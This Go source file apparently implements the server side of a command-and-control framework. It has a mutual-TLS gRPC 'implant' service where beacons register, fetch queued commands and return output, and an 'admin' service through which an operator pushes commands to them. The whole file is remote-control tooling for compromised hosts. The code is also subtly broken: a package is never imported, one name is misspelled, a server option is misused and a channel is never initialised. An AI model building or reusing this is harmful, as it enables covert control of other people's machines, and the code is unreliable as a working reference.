package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"log"
	"errors"
	"net"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"

)

type implantServer struct {
	work, output, whoami chan *grpcapi.Command // expect the whoami parameter from the beacon
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		// No work
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}

func (s *implantServer) RegisterImplant(ctx context.Context, whoami *grcpapi.Command) (*grpcapi.Empty, error) {
	log.Printf("New beacon: %c", whoami)
	return &grpcapi.Empty{},nil
}

func main() {
        var (
                implantListener, adminListener net.Listener
                err                            error
                opts                           []grpc.ServerOption
                work, output				   chan *grpcapi.Command
        )

		certificate, err := tls.LoadX509KeyPair(
	"/etc/server/certs/server.crt",
	"/etc/server/certs/server.key",
	)

	certPool := x509.NewCertPool()
	bs, err := ioutil.ReadFile("/etc/server/certs/ca.crt")
	if err != nil {
		log.Fatalf("failed to read client ca cert: %s", err)
	}

	ok := certPool.AppendCertsFromPEM(bs)
	if !ok {
		log.Fatal("failed to append client certs")
	}

	tlsConfig := &tls.Config{
		ClientAuth:   tls.RequireAndVerifyClientCert,
		Certificates: []tls.Certificate{certificate},
		ClientCAs:    certPool,
	}

        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
        implant := NewImplantServer(work, output)
        admin := NewAdminServer(work, output)
        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8010)); err != nil {
                log.Fatal(err)
        }
        if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
                log.Fatal(err)
        }

        serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig))}

        grpcImplantServer := grpc.NewServer(serverOption)
        grpcAdminServer := grpc.NewServer(opts...)
        grpcapi.RegisterImplantServer(grpcImplantServer, implant)
        grpcapi.RegisterAdminServer(grpcAdminServer, admin)

        go func() {
                grpcImplantServer.Serve(implantListener)
        }()
        grpcAdminServer.Serve(adminListener)
}
